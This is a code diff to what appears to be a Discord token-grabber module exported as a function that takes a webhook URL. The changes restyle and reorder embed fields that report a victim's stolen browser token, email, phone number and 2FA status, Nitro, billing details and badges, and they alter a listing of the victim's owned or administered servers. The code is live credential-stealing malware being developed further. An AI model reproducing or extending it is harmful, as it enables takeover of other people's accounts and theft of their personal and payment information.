@@ -82,7 +82,7 @@ const getHQGuilds = async (guilds, token) => {
                 ? `<:Owner:963333541343686696> Owner`
                 : `<:Staff:1136740017822253176> Admin`;
             const members = `Members: \`${guild.member_count}\``;
-            const name = `**${guild.name}** - (${guild.id})`;
+            const name = `(**${guild.name}**)`;
 
             return `${emoji} | ${name} - ${members}${invite ? ` - ${invite}` : ''}\n`;
 
@@ -239,37 +239,37 @@ module.exports = async (webhookUrl) => {
                         },
                         fields: [
                             {
-                                name: `<a:hearts:1176516454540116090> ${browser} Token:`,
+                                name: `<:x:1194495538138185728> ${browser} Token:`,
                                 value:  '```' + token + '```' + '\n' + `[Click Here To Copy Your Token](${copy})`,
                                 inline: false
                             },
                             { name: '\u200b', value: '\u200b', inline: false },
                             {
-                                name: 'Nitro:',
-                                value: getNitro(profile),
+                                name: '<a:mail:1245038428891123815> Email:',
+                                value:  '`' + (user.email || '❓') + '`',
                                 inline: true
                             },
                             {
-                                name: 'Phone:',
+                                name: '<a:phone:1104204812867874936> Phone:',
                                 value:  '`' + (user.phone || '❓') + (user.mfa_enabled ? ' (2FA)' : '') + '`',
                                 inline: true
                             },
                             { name: '\u200b', value: '\u200b', inline: false },
                             {
-                                name: 'Email:',
-                                value:  '`' + (user.email || '❓') + '`',
+                                name: '<a:nitro:1122755911967068210> Nitro:',
+                                value: getNitro(profile),
                                 inline: true
                             },
                             {
-                                name: 'Badges:',
+                                name: '<:billing:1122678162288037929> Billing:',
+                                value: getBilling(billing),
+                                inline: true
+                            },
+                            {
+                                name: '<a:badges:1138323945284714516> Badges:',
                                 value: getFlags(user.public_flags),
                                 inline: true
                             },
-                            {
-                                name: 'Billing:',
-                                value: getBilling(billing),
-                                inline: true
-                            }
                         ]
                     }
                 ]
